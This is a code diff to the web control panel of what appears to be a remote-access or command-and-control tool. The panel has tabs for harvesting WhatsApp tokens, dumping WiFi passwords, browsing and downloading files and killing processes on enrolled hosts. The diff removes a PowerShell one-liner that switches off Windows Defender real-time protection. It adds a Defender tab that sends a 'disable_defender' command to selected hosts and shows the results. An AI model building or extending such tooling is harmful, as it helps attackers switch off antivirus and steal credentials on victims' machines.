@@ -101,6 +101,7 @@
       <button class="tab-btn" onclick="switchTab('whatsapp', this)">WhatsApp</button>
       <button class="tab-btn" onclick="switchTab('files', this)">Files</button>
       <button class="tab-btn" onclick="switchTab('processes', this)">Processes</button>
+      <button class="tab-btn" onclick="switchTab('defender', this)">Defender</button>
     </div>
 
     <main id="tabActivity" class="tab-content active border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl">
@@ -172,7 +173,6 @@
         <button class="px-3 py-1.5 text-xs font-medium text-white bg-slate-700 hover:bg-slate-600 rounded-lg border border-slate-600 transition" onclick="execQuickCmd('rundll32.exe user32.dll,LockWorkStation')">Lock</button>
         <button class="px-3 py-1.5 text-xs font-medium text-white bg-sky-700 hover:bg-sky-600 rounded-lg border border-sky-600 transition" onclick="execQuickOpenUrl()">Open URL</button>
         <button class="px-3 py-1.5 text-xs font-medium text-white bg-cyan-800 hover:bg-cyan-700 rounded-lg border border-cyan-700 transition" onclick="wifiHarvest()">WiFi Dump</button>
-        <button class="px-3 py-1.5 text-xs font-medium text-white bg-red-800 hover:bg-red-700 rounded-lg border border-red-700 transition" onclick="execQuickCmd('powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true\"')">Disable Defender</button>
         <button class="px-3 py-1.5 text-xs font-medium text-white bg-teal-700 hover:bg-teal-600 rounded-lg border border-teal-600 transition" onclick="execQuickCmd('systeminfo | findstr /B /C:\"OS Name\" /C:\"System Boot Time\" /C:\"Total Physical Memory\"')">Sys Info</button>
       </div>
       <div class="flex items-center gap-3 mb-6">
@@ -356,6 +356,17 @@
         <button class="px-4 py-2 text-sm font-medium text-white bg-red-600 hover:bg-red-700 rounded-lg border border-red-500 transition" onclick="sendKillByName()">Kill by Name</button>
       </div>
       <div id="processResults" class="text-sm mono-log text-slate-400 bg-slate-950/50 rounded-lg p-4 border border-slate-800 overflow-y-auto" style="min-height:150px">Select a host and click Refresh Processes</div>
+    </main>
+
+    <main id="tabDefender" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <div class="flex items-center gap-3 mb-4">
+        <select id="defenderHostSelect" class="bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 focus:outline-none focus:border-rose-500 transition">
+          <option value="" disabled selected>Host...</option>
+        </select>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-red-600 hover:bg-red-700 rounded-lg border border-red-500 transition" onclick="sendDefender('disable')">Disable Defender</button>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition" onclick="sendDefender('enable')">Enable Defender</button>
+      </div>
+      <div id="defenderResults" class="text-sm mono-log text-slate-400 bg-slate-950/50 rounded-lg p-4 border border-slate-800 overflow-y-auto" style="min-height:120px">Select a host and click Disable or Enable</div>
     </main>
   </div>
 
@@ -663,6 +674,8 @@ function switchTab(tab, btn) {
   if (tab === 'files') { populateFileHostnames(); fetchDirlistResults(); fetchDownloadResults(); }
   document.getElementById('tabProcesses').classList.toggle('active', tab === 'processes');
   if (tab === 'processes') { populateProcessHostnames(); fetchProcessResults(); }
+  document.getElementById('tabDefender').classList.toggle('active', tab === 'defender');
+  if (tab === 'defender') { populateDefenderHostnames(); fetchDefenderResults(); }
 }
 
 async function fetchLatestVersion() {
@@ -1406,6 +1419,66 @@ async function fetchProcessResults() {
   } catch (_) {}
 }
 
+function populateDefenderHostnames() {
+  const sel = document.getElementById('defenderHostSelect');
+  const mainSel = document.getElementById('hostnameInput');
+  sel.innerHTML = '';
+  for (const opt of mainSel.options) {
+    if (opt.value) {
+      const n = document.createElement('option');
+      n.value = opt.value;
+      n.textContent = opt.textContent;
+      sel.appendChild(n);
+    }
+  }
+}
+
+async function sendDefender(action) {
+  const hostname = document.getElementById('defenderHostSelect').value;
+  if (!hostname) { showToast('Select a host', 'error'); return; }
+  const label = action === 'disable' ? 'Disable' : 'Enable';
+  try {
+    await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'disable_defender', hostname: hostname, payload: action, executed: false })
+    });
+    document.getElementById('defenderResults').textContent = label + ' Defender requested for ' + hostname + ' (check back in ~60s)';
+    showToast(label + ' Defender requested for ' + hostname, 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
+async function fetchDefenderResults() {
+  const container = document.getElementById('defenderResults');
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/exec_results?order=created_at.desc&limit=10'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const rows = data.filter(r => r.command && r.command.startsWith('disable_defender'));
+    if (rows.length === 0) return;
+    container.innerHTML = rows.slice(0, 5).map(r => {
+      const ts = r.created_at ? new Date(r.created_at).toLocaleString() : '-';
+      const action = r.command && r.command.includes('enable') ? 'Enable' : 'Disable';
+      const ok = r.exit_code === 0;
+      const denied = r.exit_code === 2;
+      let color, icon;
+      if (ok) { color = 'text-green-400'; icon = '✓'; }
+      else if (denied) { color = 'text-amber-400'; icon = '⚠'; }
+      else { color = 'text-red-400'; icon = '✗'; }
+      const out = (r.output || '').trim();
+      return '<div class="mb-3 pb-3 border-b border-slate-800 last:border-0">'
+        + '<div class="flex items-center gap-2 mb-1">'
+        + '<span class="' + color + ' text-sm font-bold">' + icon + '</span>'
+        + '<span class="text-slate-500 text-xs">' + ts + '</span>'
+        + '<span class="text-emerald-400 text-xs">' + escapeHtml(r.hostname || '') + '</span>'
+        + '<span class="text-slate-300 text-xs font-medium">' + action + ' Defender</span>'
+        + '</div>'
+        + '<div class="text-slate-400 text-xs ml-5">' + escapeHtml(out.substring(0, 500)) + '</div>'
+        + '</div>';
+    }).join('');
+  } catch (_) {}
+}
+
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
@@ -1448,6 +1521,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'whatsapp') fetchWhatsAppTokens();
     else if (currentTab === 'files') { fetchDirlistResults(); fetchDownloadResults(); }
     else if (currentTab === 'processes') { fetchProcessResults(); }
+    else if (currentTab === 'defender') { fetchDefenderResults(); }
   }, 20000);
   setInterval(tick, 1000);
 });
